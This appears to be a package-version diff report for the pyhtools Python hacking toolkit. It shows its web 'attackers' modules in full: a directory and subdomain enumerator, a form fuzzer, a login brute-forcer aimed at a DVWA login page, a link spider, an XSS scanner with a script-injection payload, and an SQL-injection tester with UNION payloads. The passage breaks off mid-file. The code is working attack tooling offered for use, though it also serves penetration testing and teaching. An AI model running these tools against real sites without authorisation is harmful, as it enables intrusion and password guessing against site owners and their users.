-from asyncio import ensure_future, gather, run
-from urllib.parse import urljoin
-from pyhtools.attackers.web.utils import AsyncRLRequests
-from pyhtools.utils import read_file_lines
-
-import logging
-
-logger = logging.getLogger(__name__)
-logging.basicConfig(level=logging.INFO,
-                    format='[%(asctime)s] [%(levelname)s] - %(message)s')
-
-
-class Discoverer:
-    '''
-    Discoverer can be used to enumerate directories and subdomains of target website.
-    '''
-
-    def __init__(self, *args, **kwargs) -> None:
-        self._requester = AsyncRLRequests(*args, **kwargs)
-
-    async def _filter_request(self, url: str, status_codes: list[int] = [200, 403, 500]):
-        '''
-        prints url if reponse status code matches code from status_codes.
-        '''
-        response = await self._requester.request(url=url)
-        
-        if isinstance(response, dict) and response.get('status') in status_codes:
-            print(url, response.get('status'))
-
-    async def check_dirs(self, domain: str, wordlist_path: str, status_codes: list[int] = [200, 403, 500]):
-        '''
-        enumerate website directories
-        '''
-        if not domain.endswith('/'):
-            domain += '/'
-        if not domain.startswith('https://') or domain.startswith('http://'):
-            domain = f'http://{domain}'
-
-        dirs = read_file_lines(wordlist_path)
-
-        tasks = []
-        for dir in dirs:
-            link = urljoin(domain, dir)
-            tasks.append(
-                ensure_future(
-                    self._filter_request(link, status_codes)
-                )
-            )
-
-        await gather(*tasks)
-
-    async def check_subdomains(self, domain: str, wordlist_path: str, status_codes: list[int] = [200, 403, 500]):
-        '''
-        enumerate website subdomains
-        '''
-        domain = domain.replace('https://', '').replace('http://', '')
-        subdomains = read_file_lines(wordlist_path)
-
-        tasks = []
-        for subdomain in subdomains:
-            url = f'http://{subdomain}.{domain}'
-            tasks.append(
-                ensure_future(
-                    self._filter_request(url, status_codes)
-                )
-            )
-
-        await gather(*tasks)
+from asyncio import ensure_future, gather, run
+from urllib.parse import urljoin
+from pyhtools.attackers.web.utils import AsyncRLRequests
+from pyhtools.utils import read_file_lines
+
+import logging
+
+logger = logging.getLogger(__name__)
+logging.basicConfig(level=logging.INFO,
+                    format='[%(asctime)s] [%(levelname)s] - %(message)s')
+
+
+class Discoverer:
+    '''
+    Discoverer can be used to enumerate directories and subdomains of target website.
+    '''
+
+    def __init__(self, *args, **kwargs) -> None:
+        self._requester = AsyncRLRequests(*args, **kwargs)
+
+    async def _filter_request(self, url: str, status_codes: list[int] = [200, 403, 500]):
+        '''
+        prints url if reponse status code matches code from status_codes.
+        '''
+        response = await self._requester.request(url=url)
+        
+        if isinstance(response, dict) and response.get('status') in status_codes:
+            print(url, response.get('status'))
+
+    async def check_dirs(self, domain: str, wordlist_path: str, status_codes: list[int] = [200, 403, 500]):
+        '''
+        enumerate website directories
+        '''
+        if not domain.endswith('/'):
+            domain += '/'
+        if not domain.startswith('https://') or domain.startswith('http://'):
+            domain = f'http://{domain}'
+
+        dirs = read_file_lines(wordlist_path)
+
+        tasks = []
+        for dir in dirs:
+            link = urljoin(domain, dir)
+            tasks.append(
+                ensure_future(
+                    self._filter_request(link, status_codes)
+                )
+            )
+
+        await gather(*tasks)
+
+    async def check_subdomains(self, domain: str, wordlist_path: str, status_codes: list[int] = [200, 403, 500]):
+        '''
+        enumerate website subdomains
+        '''
+        domain = domain.replace('https://', '').replace('http://', '')
+        subdomains = read_file_lines(wordlist_path)
+
+        tasks = []
+        for subdomain in subdomains:
+            url = f'http://{subdomain}.{domain}'
+            tasks.append(
+                ensure_future(
+                    self._filter_request(url, status_codes)
+                )
+            )
+
+        await gather(*tasks)
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/web/get_forms.py` & `pyhtools-2.2.2/pyhtools/attackers/web/get_forms.py`

 * *Ordering differences only*

 * *Files 21% similar despite different names*

```diff
@@ -1,67 +1,67 @@
-import requests
-from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-
-# Beta Tool
-def remove_escape_seq(content:str)->str:
-    '''
-    desc: removes \r \t \n from the html parsed content if present.
-    params: content(str)
-    returns: str
-    '''
-    return content.replace(r'\n','').replace(r'\t','').replace(r'\r','')
-
-
-def get_page_content(url:str):
-    '''
-    desc: extracts html code of the webpage.
-    params: url(str)
-    returns: str
-    '''
-    response = requests.get(url)
-    content = str(response.content)
-    content = remove_escape_seq(content)
-    return content
-
-
-def fuzz_forms(target_url:str):
-    '''
-    desc: get forms from html page, send post request and return html response 
-    params: target_url (str)
-    returns: str
-    '''
-    page_content = get_page_content(target_url)
-
-    # remove\r \t \n from the page content
-    page_content = remove_escape_seq(page_content)
-
-    page_html = BeautifulSoup(page_content,'html.parser')
-    forms = page_html.find_all(name='form')
-    for form in forms:
-        action = form.get('action')
-        post_url = urljoin(target_url, action)
-        # print(post_url)
-        
-        # method = form.get('method')
-
-        post_data_dict = {}
-        inputs = form.find_all('input')
-        for input in inputs:
-            inp_name = input.get('name') 
-            inp_type = input.get('type')
-            inp_value = input.get('value')
-
-            if inp_type == 'text':
-                inp_value = 'pyhtools-form-test'
-
-            elif inp_type == 'password':
-                inp_value = 'pyhtools-P#$$Wd!!!'
-
-            post_data_dict[inp_name]=inp_value
-
-        post_response = requests.post(url=post_url, data=post_data_dict)
-        post_response_content = remove_escape_seq(str(post_response.content))
-        post_content = BeautifulSoup(post_response_content, 'html.parser')
-
-        return str(post_content.prettify())
+import requests
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin
+
+# Beta Tool
+def remove_escape_seq(content:str)->str:
+    '''
+    desc: removes \r \t \n from the html parsed content if present.
+    params: content(str)
+    returns: str
+    '''
+    return content.replace(r'\n','').replace(r'\t','').replace(r'\r','')
+
+
+def get_page_content(url:str):
+    '''
+    desc: extracts html code of the webpage.
+    params: url(str)
+    returns: str
+    '''
+    response = requests.get(url)
+    content = str(response.content)
+    content = remove_escape_seq(content)
+    return content
+
+
+def fuzz_forms(target_url:str):
+    '''
+    desc: get forms from html page, send post request and return html response 
+    params: target_url (str)
+    returns: str
+    '''
+    page_content = get_page_content(target_url)
+
+    # remove\r \t \n from the page content
+    page_content = remove_escape_seq(page_content)
+
+    page_html = BeautifulSoup(page_content,'html.parser')
+    forms = page_html.find_all(name='form')
+    for form in forms:
+        action = form.get('action')
+        post_url = urljoin(target_url, action)
+        # print(post_url)
+        
+        # method = form.get('method')
+
+        post_data_dict = {}
+        inputs = form.find_all('input')
+        for input in inputs:
+            inp_name = input.get('name') 
+            inp_type = input.get('type')
+            inp_value = input.get('value')
+
+            if inp_type == 'text':
+                inp_value = 'pyhtools-form-test'
+
+            elif inp_type == 'password':
+                inp_value = 'pyhtools-P#$$Wd!!!'
+
+            post_data_dict[inp_name]=inp_value
+
+        post_response = requests.post(url=post_url, data=post_data_dict)
+        post_response_content = remove_escape_seq(str(post_response.content))
+        post_content = BeautifulSoup(post_response_content, 'html.parser')
+
+        return str(post_content.prettify())
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/web/login_guesser.py` & `pyhtools-2.2.2/pyhtools/attackers/web/login_guesser.py`

 * *Ordering differences only*

 * *Files 20% similar despite different names*

```diff
@@ -1,27 +1,27 @@
-import requests
-import os
-import sys
-from pyhtools.UI.colors import BRIGHT_YELLOW, BRIGHT_WHITE, BRIGHT_RED
-
-def bruteforce_login(target_url:str, wordlist_file:str, post_values:dict):
-    # tested on DVWA web app.
-    # target_url = "http://10.0.2.30/dvwa/login.php"
-    # wordlist_file = "full_path_to_wordlist"
-    # post_values = {"username":"admin", "password":"", "Login":"submit"}
-
-    if os.path.isfile(wordlist_file):
-        print(BRIGHT_WHITE + '[*] Wordlist File Found! Starting Bruteforce Attack!!')
-        with open(wordlist_file,'r') as wordlist:
-            for word in wordlist:
-                password = word.strip()
-                post_values['password'] = password
-                post_response = requests.post(target_url, data=post_values)
-                content = str(post_response.content)
-                if "Login failed" not in content:
-                    print(BRIGHT_YELLOW + '[*] Password Found! : ' + password)
-                    sys.exit()
-
-        print(BRIGHT_RED + '[!] Password Not Found!')
-
-    else:
-        print(BRIGHT_RED + '[-] Wordlist Not Found.')
+import requests
+import os
+import sys
+from pyhtools.UI.colors import BRIGHT_YELLOW, BRIGHT_WHITE, BRIGHT_RED
+
+def bruteforce_login(target_url:str, wordlist_file:str, post_values:dict):
+    # tested on DVWA web app.
+    # target_url = "http://10.0.2.30/dvwa/login.php"
+    # wordlist_file = "full_path_to_wordlist"
+    # post_values = {"username":"admin", "password":"", "Login":"submit"}
+
+    if os.path.isfile(wordlist_file):
+        print(BRIGHT_WHITE + '[*] Wordlist File Found! Starting Bruteforce Attack!!')
+        with open(wordlist_file,'r') as wordlist:
+            for word in wordlist:
+                password = word.strip()
+                post_values['password'] = password
+                post_response = requests.post(target_url, data=post_values)
+                content = str(post_response.content)
+                if "Login failed" not in content:
+                    print(BRIGHT_YELLOW + '[*] Password Found! : ' + password)
+                    sys.exit()
+
+        print(BRIGHT_RED + '[!] Password Not Found!')
+
+    else:
+        print(BRIGHT_RED + '[-] Wordlist Not Found.')
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/web/spider.py` & `pyhtools-2.2.2/pyhtools/attackers/web/spider.py`

 * *Ordering differences only*

 * *Files 26% similar despite different names*

```diff
@@ -1,88 +1,88 @@
-from bs4 import BeautifulSoup
-from html import unescape
-from urllib.parse import urljoin
-from .utils import AsyncRLRequests
-
-
-class Spider:
-    def __init__(self, rate_limit:int=100, delay:int=0.0001, headers:dict=None) -> None:
-        # list to save links on the whole webpage
-        # to avoid repetition
-        self.target_links = set()
-        self._client = AsyncRLRequests(rate_limit=rate_limit, delay=delay, headers=headers)
-
-    async def get_links(self, url: str) -> set:
-        '''
-        description: extracts links from the whole webpage.
-        params: url(str) of the webpage
-        returns: links(list) present in the webpage
-        '''
-        response = await self._client.request(url=url)
-        html = response.get('res_body')
-        if html is None:
-            return set()
-        
-        soup = BeautifulSoup(html, 'html.parser')
-
-        href_links = set()
-        for link in soup.find_all(href=True):
-            href_link = link.get('href')
-            if href_link:
-                href_links.add(href_link)
-
-        return href_links
-
-    async def get_target_links(self, url: str, print_link: bool = True):
-        '''
-        description: extracts useful links and prints them which are
-        only related to the target webpage.
-        params: links(list) from the target webpage
-        returns: useful links(list) related to target webpage
-        '''
-        # extract links from page
-        links:set = await self.get_links(url)
-
-        new_links = set()
-        for link in links:
-            link = urljoin(url, link)
-
-            if '#' in link:
-                link = link.split('#')[0]
-
-            if link not in self.target_links and url in link:
-                link = unescape(link)
-                new_links.add(link)
-
-                if print_link:
-                    print(link)
-
-        return new_links
-
-    async def start(self, target_url:str, print_links: bool = True):
-        '''
-        description: starts spider
-        '''
-        queue = [target_url]
-        while queue:
-            # extract a link from queue
-            current_url = queue.pop(0)
-
-            # continue if url is already visited
-            if current_url in self.target_links:
-                continue
-
-            # add url to visited set
-            self.target_links.add(current_url)
-
-            # skip scraping static files since it'll slow down process
-            if current_url.endswith(('.css', '.js','.jpeg', '.png','.svg')):
-                continue
-
-            # get links from 
-            links = await self.get_target_links(current_url, print_link=print_links)
-
-            # add new links to queue
-            queue.extend(links - self.target_links)
-
-        return self.target_links
-    
+from bs4 import BeautifulSoup
+from html import unescape
+from urllib.parse import urljoin
+from .utils import AsyncRLRequests
+
+
+class Spider:
+    def __init__(self, rate_limit:int=100, delay:int=0.0001, headers:dict=None) -> None:
+        # list to save links on the whole webpage
+        # to avoid repetition
+        self.target_links = set()
+        self._client = AsyncRLRequests(rate_limit=rate_limit, delay=delay, headers=headers)
+
+    async def get_links(self, url: str) -> set:
+        '''
+        description: extracts links from the whole webpage.
+        params: url(str) of the webpage
+        returns: links(list) present in the webpage
+        '''
+        response = await self._client.request(url=url)
+        html = response.get('res_body')
+        if html is None:
+            return set()
+        
+        soup = BeautifulSoup(html, 'html.parser')
+
+        href_links = set()
+        for link in soup.find_all(href=True):
+            href_link = link.get('href')
+            if href_link:
+                href_links.add(href_link)
+
+        return href_links
+
+    async def get_target_links(self, url: str, print_link: bool = True):
+        '''
+        description: extracts useful links and prints them which are
+        only related to the target webpage.
+        params: links(list) from the target webpage
+        returns: useful links(list) related to target webpage
+        '''
+        # extract links from page
+        links:set = await self.get_links(url)
+
+        new_links = set()
+        for link in links:
+            link = urljoin(url, link)
+
+            if '#' in link:
+                link = link.split('#')[0]
+
+            if link not in self.target_links and url in link:
+                link = unescape(link)
+                new_links.add(link)
+
+                if print_link:
+                    print(link)
+
+        return new_links
+
+    async def start(self, target_url:str, print_links: bool = True):
+        '''
+        description: starts spider
+        '''
+        queue = [target_url]
+        while queue:
+            # extract a link from queue
+            current_url = queue.pop(0)
+
+            # continue if url is already visited
+            if current_url in self.target_links:
+                continue
+
+            # add url to visited set
+            self.target_links.add(current_url)
+
+            # skip scraping static files since it'll slow down process
+            if current_url.endswith(('.css', '.js','.jpeg', '.png','.svg')):
+                continue
+
+            # get links from 
+            links = await self.get_target_links(current_url, print_link=print_links)
+
+            # add new links to queue
+            queue.extend(links - self.target_links)
+
+        return self.target_links
+
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/web/vuln_scanner/scanner.py` & `pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/scanner.py`

 * *Ordering differences only*

 * *Files 15% similar despite different names*

```diff
@@ -1,179 +1,179 @@
-import requests
-import re
-from urllib.parse import urljoin
-from bs4 import BeautifulSoup
-from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW
-
-
-class Scanner:
-    def __init__(self, url:str, ignore_links:list) -> None:
-        self.target_url = url
-        
-        if ignore_links:
-            self.ignore_links = ignore_links
-        else:
-            self.ignore_links = []
-        
-        self.session = requests.Session()
-        self.target_links = []
-
-
-    def get_links(self, url:str)->list:
-        '''
-        description: extracts links from the whole webpage.
-        params: url(str) of the webpage
-        returns: links(list) present in the webpage
-        '''
-        response = self.session.get(url)
-        content = str(response.content)
-        return re.findall(r'(?:href=")(.*?)"',content)
-
-
-    def get_target_links(self, url:str):
-        '''
-        description: extracts useful links and prints them which are
-        only related to the target webpage.
-        params: links(list) from the target webpage
-        returns: useful links(list) related to target webpage
-        '''
-        links = self.get_links(url)
-        for link in links:
-            link = urljoin(url, link)
-            
-            if '#' in link:
-                link = link.split('#')[0]
-
-            if link not in self.target_links and self.target_url in link and link not in self.ignore_links:
-                self.target_links.append(link)
-                if requests.get(link).status_code==200:
-                    print(link)
-                self.get_target_links(link)
-    
-
-    def remove_escape_seq(self, content:str)->str:
-        r'''
-        desc: removes \r \t \n from the html parsed content if present.
-        params: content(str)
-        returns: str
-        '''
-        return content.replace(r'\n','').replace(r'\t','').replace(r'\r','').replace(r"\'","'")
-
-
-    def get_page_content(self, url:str)->str:
-        '''
-        desc: extracts html code of the webpage.
-        params: url(str)
-        returns: str
-        '''
-        response = self.session.get(url)
-        content = str(response.content)
-        content = self.remove_escape_seq(content)
-        return content
-
-
-    def get_forms(self, url:str)->list:
-        '''
-        description: extracts all the forms on the url webpage.
-        params: url(str)
-        returns: forms(list)
-        ''' 
-        page_content = self.get_page_content(url)
-        page_content = self.remove_escape_seq(page_content)
-        page_html = BeautifulSoup(page_content,'html.parser')
-        return page_html.find_all(name='form')
-
-
-    def submit_form(self, form, value, url):
-        '''
-        description: submits form with passed value to url passed
-        params: form, value, url
-        returns: contents of the reponse.
-        '''
-        action = form.get('action')
-        post_url = urljoin(url, action)
-        # print(post_url)
-
-        method = form.get('method')
-        post_data_dict = {}
-
-        inputs = form.find_all('input')
-        for input in inputs:
-            inp_name = input.get('name') 
-            inp_type = input.get('type')
-            inp_value = input.get('value')
-
-            if inp_type == 'text':
-                inp_value = value
-
-            post_data_dict[inp_name]=inp_value
-
-        if method == 'post':
-            post_response = self.session.post(url=post_url, data=post_data_dict)
-        else:
-            post_response = self.session.get(url=url, params=post_data_dict)
-        
-        return self.remove_escape_seq(str(post_response.content))
-        
-    
-    def is_xss_vulnerable_in_form(self, form, url)->bool:
-        '''
-        description: tests whether the passed form is xss vulnerable or not. 
-        returns True if vulnerable. 
-        params: form, url
-        returns: bool
-        '''
-        test_script_payload = "<scRipt>alert('vulnerable')</sCript>"
-        response_content = self.submit_form(form, test_script_payload, url)
-        # response = BeautifulSoup(response_content, 'html.parser')
-        # print(BRIGHT_YELLOW + '[-] RESPONSE: \n', response.prettify())
-        return test_script_payload in response_content
-
-
-    def is_xss_vulnerable_in_link(self, url, payload=None):
-        '''
-        description: tests whether the passed url is xss vulnerable or not. 
-        returns True if vulnerable. 
-        params: form, url, payload
-        returns: bool
-        '''
-        if payload is None:
-            payload = "<scRipt>alert('vulnerable')</sCript>"
-        url = url.replace('=',f'={payload}')
-        response_content = self.get_page_content(url)
-        # response = BeautifulSoup(response_content, 'html.parser')
-        # print(BRIGHT_YELLOW + '[-] RESPONSE: \n', response.prettify())
-
-        return payload in response_content
-
-
-    def run(self):
-        '''
-        Starts the scanner.
-        '''
-        try:
-            try:
-                print(BRIGHT_WHITE + '[*] Spider is mapping website.')
-                print(BRIGHT_YELLOW + '[!] Press ctrl+c to stop mapping!')
-                self.get_target_links(self.target_url)
-            except KeyboardInterrupt:
-                print(BRIGHT_YELLOW + '\r[!] ctrl+c detected! Stopping Spider. Website mapping stopped.')
-            
-            print(BRIGHT_WHITE + '[*] Finding vulnerabilites on the mapped webpages.')
-            forms = self.get_forms(self.target_url)
-            
-            for link in self.target_links:
-                forms = self.get_forms(link)
-                for form in forms:
-                    print(BRIGHT_WHITE + '[*] Scanning/Testing vuln in form of link: ', link)
-                    if self.is_xss_vulnerable_in_form(form,link):
-                        print(BRIGHT_YELLOW + f'[!] Found XSS vuln in {link} form : ')
-                        print(form)
-                        print()
-
-                if "=" in link:
-                    print(BRIGHT_WHITE + '[*] Scanning/Testing vuln from URL of link: ', link)
-                    if self.is_xss_vulnerable_in_link(link):
-                        print(BRIGHT_YELLOW + '[!] Found XSS vuln in URL :', link)
-                        print()
-        except Exception as e:
+import requests
+import re
+from urllib.parse import urljoin
+from bs4 import BeautifulSoup
+from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_WHITE, BRIGHT_YELLOW
+
+
+class Scanner:
+    def __init__(self, url:str, ignore_links:list) -> None:
+        self.target_url = url
+        
+        if ignore_links:
+            self.ignore_links = ignore_links
+        else:
+            self.ignore_links = []
+        
+        self.session = requests.Session()
+        self.target_links = []
+
+
+    def get_links(self, url:str)->list:
+        '''
+        description: extracts links from the whole webpage.
+        params: url(str) of the webpage
+        returns: links(list) present in the webpage
+        '''
+        response = self.session.get(url)
+        content = str(response.content)
+        return re.findall(r'(?:href=")(.*?)"',content)
+
+
+    def get_target_links(self, url:str):
+        '''
+        description: extracts useful links and prints them which are
+        only related to the target webpage.
+        params: links(list) from the target webpage
+        returns: useful links(list) related to target webpage
+        '''
+        links = self.get_links(url)
+        for link in links:
+            link = urljoin(url, link)
+            
+            if '#' in link:
+                link = link.split('#')[0]
+
+            if link not in self.target_links and self.target_url in link and link not in self.ignore_links:
+                self.target_links.append(link)
+                if requests.get(link).status_code==200:
+                    print(link)
+                self.get_target_links(link)
+    
+
+    def remove_escape_seq(self, content:str)->str:
+        r'''
+        desc: removes \r \t \n from the html parsed content if present.
+        params: content(str)
+        returns: str
+        '''
+        return content.replace(r'\n','').replace(r'\t','').replace(r'\r','').replace(r"\'","'")
+
+
+    def get_page_content(self, url:str)->str:
+        '''
+        desc: extracts html code of the webpage.
+        params: url(str)
+        returns: str
+        '''
+        response = self.session.get(url)
+        content = str(response.content)
+        content = self.remove_escape_seq(content)
+        return content
+
+
+    def get_forms(self, url:str)->list:
+        '''
+        description: extracts all the forms on the url webpage.
+        params: url(str)
+        returns: forms(list)
+        ''' 
+        page_content = self.get_page_content(url)
+        page_content = self.remove_escape_seq(page_content)
+        page_html = BeautifulSoup(page_content,'html.parser')
+        return page_html.find_all(name='form')
+
+
+    def submit_form(self, form, value, url):
+        '''
+        description: submits form with passed value to url passed
+        params: form, value, url
+        returns: contents of the reponse.
+        '''
+        action = form.get('action')
+        post_url = urljoin(url, action)
+        # print(post_url)
+
+        method = form.get('method')
+        post_data_dict = {}
+
+        inputs = form.find_all('input')
+        for input in inputs:
+            inp_name = input.get('name') 
+            inp_type = input.get('type')
+            inp_value = input.get('value')
+
+            if inp_type == 'text':
+                inp_value = value
+
+            post_data_dict[inp_name]=inp_value
+
+        if method == 'post':
+            post_response = self.session.post(url=post_url, data=post_data_dict)
+        else:
+            post_response = self.session.get(url=url, params=post_data_dict)
+        
+        return self.remove_escape_seq(str(post_response.content))
+        
+    
+    def is_xss_vulnerable_in_form(self, form, url)->bool:
+        '''
+        description: tests whether the passed form is xss vulnerable or not. 
+        returns True if vulnerable. 
+        params: form, url
+        returns: bool
+        '''
+        test_script_payload = "<scRipt>alert('vulnerable')</sCript>"
+        response_content = self.submit_form(form, test_script_payload, url)
+        # response = BeautifulSoup(response_content, 'html.parser')
+        # print(BRIGHT_YELLOW + '[-] RESPONSE: \n', response.prettify())
+        return test_script_payload in response_content
+
+
+    def is_xss_vulnerable_in_link(self, url, payload=None):
+        '''
+        description: tests whether the passed url is xss vulnerable or not. 
+        returns True if vulnerable. 
+        params: form, url, payload
+        returns: bool
+        '''
+        if payload is None:
+            payload = "<scRipt>alert('vulnerable')</sCript>"
+        url = url.replace('=',f'={payload}')
+        response_content = self.get_page_content(url)
+        # response = BeautifulSoup(response_content, 'html.parser')
+        # print(BRIGHT_YELLOW + '[-] RESPONSE: \n', response.prettify())
+
+        return payload in response_content
+
+
+    def run(self):
+        '''
+        Starts the scanner.
+        '''
+        try:
+            try:
+                print(BRIGHT_WHITE + '[*] Spider is mapping website.')
+                print(BRIGHT_YELLOW + '[!] Press ctrl+c to stop mapping!')
+                self.get_target_links(self.target_url)
+            except KeyboardInterrupt:
+                print(BRIGHT_YELLOW + '\r[!] ctrl+c detected! Stopping Spider. Website mapping stopped.')
+            
+            print(BRIGHT_WHITE + '[*] Finding vulnerabilites on the mapped webpages.')
+            forms = self.get_forms(self.target_url)
+            
+            for link in self.target_links:
+                forms = self.get_forms(link)
+                for form in forms:
+                    print(BRIGHT_WHITE + '[*] Scanning/Testing vuln in form of link: ', link)
+                    if self.is_xss_vulnerable_in_form(form,link):
+                        print(BRIGHT_YELLOW + f'[!] Found XSS vuln in {link} form : ')
+                        print(form)
+                        print()
+
+                if "=" in link:
+                    print(BRIGHT_WHITE + '[*] Scanning/Testing vuln from URL of link: ', link)
+                    if self.is_xss_vulnerable_in_link(link):
+                        print(BRIGHT_YELLOW + '[!] Found XSS vuln in URL :', link)
+                        print()
+        except Exception as e:
             print(BRIGHT_RED + f'[-] Exception : {e}')
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/web/vuln_scanner/sqli.py` & `pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/sqli.py`

 * *Ordering differences only*

 * *Files 13% similar despite different names*

```diff
@@ -1,82 +1,82 @@
-'''
-Module: sqli.py
-Author: dmdhrumilmistry
-Project: github.com/dmdhrumilmistry/pyhtools
-License: MIT
-'''
-from argparse import ArgumentParser
-from requests import get
-from sys import exit
-
-
-def is_url_valid(url: str) -> bool:
-    '''
-    desc: checks if url is valid, returns True if url is valid else False
-    params: url (str): url of the target
-    returns: bool
-    '''
-    is_valid = False
-    if 'http://' in url or 'https://' in url:
-        is_valid = True
-
-    if len(url.split('?')[-1]) == 0:
-        is_valid = False
-
-    return is_valid
-
-
-def is_vulnerable(url: str) -> bool:
-    '''
-    desc: tests whether app is vulnerable to the url, returns True if vulnerable else returns False
-    params: url (str): url of the target
-    returns: bool
-    '''
-    response = get(url=url)
-    content = response.content.lower()
-
-    if response.status_code not in (200, 404) or b'error' in content or b'on line' in content or b'at line' in content:
-        return True
-
-    return False
-
-
-def enumerate_tests(url):
-    '''
-    desc: tests application for various SQL injection methods
-    params: url (str): url of the target
-    returns: None
-    '''
-    vuln_links = 0
-    sqli_payloads = ["'", "'--",
-                     "' UNION SELECT NULL--", "' UNION ORDER BY 1--"]
-
-    for payload in sqli_payloads:
-        payload_url = url + payload
-
-        if is_vulnerable(payload_url):
-            print(f'[URL] "{payload_url}"')
-            print(f'[PAYLOAD] {payload}')
-            print('-'*40)
-            vuln_links += 1
-
-    print(f'[VULN] {vuln_links} total vulnerable links found')
-
-
-if __name__ == '__main__':
-    # create argument parser
-    parser = ArgumentParser()
-    parser.add_argument('-u', '--url', dest='url',
-                        help='URL of the target with parameter', required=True)
-
-    # get args
-    args = parser.parse_args()
-    url = args.url
-
-    # verify url
-    if not is_url_valid(url):
-        print('[ERROR] URL is invalid')
-        print('[HINT] use `http://` or `https://` in url')
-        exit()
-
-    # test Web Application
-    enumerate_tests(url)
+'''
+Module: sqli.py
+Author: dmdhrumilmistry
+Project: github.com/dmdhrumilmistry/pyhtools
+License: MIT
+'''
+from argparse import ArgumentParser
+from requests import get
+from sys import exit
+
+
+def is_url_valid(url: str) -> bool:
+    '''
+    desc: checks if url is valid, returns True if url is valid else False
+    params: url (str): url of the target
+    returns: bool
+    '''
+    is_valid = False
+    if 'http://' in url or 'https://' in url:
+        is_valid = True
+
+    if len(url.split('?')[-1]) == 0:
+        is_valid = False
+
+    return is_valid
+
+
+def is_vulnerable(url: str) -> bool:
+    '''
+    desc: tests whether app is vulnerable to the url, returns True if vulnerable else returns False
+    params: url (str): url of the target
+    returns: bool
+    '''
+    response = get(url=url)
+    content = response.content.lower()
+
+    if response.status_code not in (200, 404) or b'error' in content or b'on line' in content or b'at line' in content:
+        return True
+
+    return False
+
+
+def enumerate_tests(url):
+    '''
+    desc: tests application for various SQL injection methods
+    params: url (str): url of the target
+    returns: None
+    '''
+    vuln_links = 0
+    sqli_payloads = ["'", "'--",
+                     "' UNION SELECT NULL--", "' UNION ORDER BY 1--"]
+
+    for payload in sqli_payloads:
+        payload_url = url + payload
+
+        if is_vulnerable(payload_url):
+            print(f'[URL] "{payload_url}"')
+            print(f'[PAYLOAD] {payload}')
+            print('-'*40)
+            vuln_links += 1
+
+    print(f'[VULN] {vuln_links} total vulnerable links found')
+
+
+if __name__ == '__main__':
+    # create argument parser
+    parser = ArgumentParser()
+    parser.add_argument('-u', '--url', dest='url',
+                        help='URL of the target with parameter', required=True)
+
+    # get args
+    args = parser.parse_args()
+    url = args.url
+
+    # verify url
+    if not is_url_valid(url):
+        print('[ERROR] URL is invalid')
+        print('[HINT] use `http://` or `https://` in url')
+        exit()
+
+    # test Web Application
+    enumerate_tests(url)
```

### Comparing `pyhtools-2.2.1/pyhtools/attackers/web/vuln_scanner/vuln_scanner.py` & `pyhtools-2.2.2/pyhtools/attackers/web/vuln_scanner/vuln_scanner.py`

 * *Ordering differences only*

 * *Files 20% similar despite different names*

```diff
@@ -1,79 +1,79 @@
-import scanner
-import argparse
-from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_YELLOW
-import sys
-
-
-def get_args():
-    '''
-    description: get arguments from the user.
-    params: None
-    returns: dictionary of arguments.
-    '''
-    parser = argparse.ArgumentParser(description='Web Application Vulnerability Scanner')
-    parser.add_argument('-t', '--target-url',dest='target_url',help='root url of the target website', required=True)
-    parser.add_argument('-ig', '--ignore-links', dest='ignore_links', help='url of wepages which are to be ignored while scanning/testing for vulnerabilities separated by commas')
-    parser.add_argument('-l','--login-link',dest='login_link',help='direct login/authentication link')
-    parser.add_argument('-ld', '--login-details', dest='login_details', help='pass login details if authentication required as username,password (separated by comma)')
-    args = parser.parse_args()
-
-    
-    if args.target_url:
-        target_url = args.target_url
-
-    login_link = None
-    if args.login_link:
-        login_link = args.login_link
-
-    login_details = None
-    if args.login_details is not None:
-        login_details = [detail.strip() for detail in args.login_details.split(',')]
-
-    ignore_links = None
-    if args.ignore_links is not None:
-        ignore_links = [link.strip() for link in args.ignore_links.split(',')]
-
-    return {
-        "target_url": target_url,
-        "ignore_links": ignore_links,
-        "login_link": login_link,
-        "login_details" : login_details,
-    }
-
-
-
-if __name__ == '__main__':
-    args = get_args()
-
-    TARGET_URL = args['target_url']
-    print(BRIGHT_YELLOW + '[*] TARGET URL: ', TARGET_URL)
-
-    IGNORE_LINKS = args['ignore_links']
-    print(BRIGHT_YELLOW + '[*] LINKS TO BE IGNORED: ', IGNORE_LINKS)
-
-    authentication_required = False
-    if args['login_details'] is not None and args['login_link'] is not None:
-        try:
-            LOGIN_LINK = args['login_link']
-            print(BRIGHT_YELLOW + '[*] LOGIN LINK: ', LOGIN_LINK)
-
-            USERNAME = args['login_details'][0]
-            print(BRIGHT_YELLOW +'[*] USERNAME: ', USERNAME)
-            
-            PASSWORD = args['login_details'][1]
-            print(BRIGHT_YELLOW + '[*] PASSWORD: ', PASSWORD)
-            
-            authentication_required = True
-        
-        except IndexError:
-            print(BRIGHT_RED + '[-] PLEASE PROVIDE ALL THE REQUIRED VALUES.')
-            print(BRIGHT_YELLOW + '[*] USE -h or --help for usage.')
-            sys.exit()
-
-    print()
-
-    vuln_scanner = scanner.Scanner(TARGET_URL, IGNORE_LINKS)
-    if authentication_required:
-        login_post_values = {"username":USERNAME, "password":PASSWORD, "Login":"submit"}
-        vuln_scanner.session.post(LOGIN_LINK, data=login_post_values)
+import scanner
+import argparse
+from pyhtools.UI.colors import BRIGHT_RED, BRIGHT_YELLOW
+import sys
+
+
+def get_args():
+    '''
+    description: get arguments from the user.
+    params: None
+    returns: dictionary of arguments.
+    '''
+    parser = argparse.ArgumentParser(description='Web Application Vulnerability Scanner')
+    parser.add_argument('-t', '--target-url',dest='target_url',help='root url of the target website', required=True)
+    parser.add_argument('-ig', '--ignore-links', dest='ignore_links', help='url of wepages which are to be ignored while scanning/testing for vulnerabilities separated by commas')
+    parser.add_argument('-l','--login-link',dest='login_link',help='direct login/authentication link')
+    parser.add_argument('-ld', '--login-details', dest='login_details', help='pass login details if authentication required as username,password (separated by comma)')
+    args = parser.parse_args()
+
+    
+    if args.target_url:
+        target_url = args.target_url
+
+    login_link = None
+    if args.login_link:
+        login_link = args.login_link
+
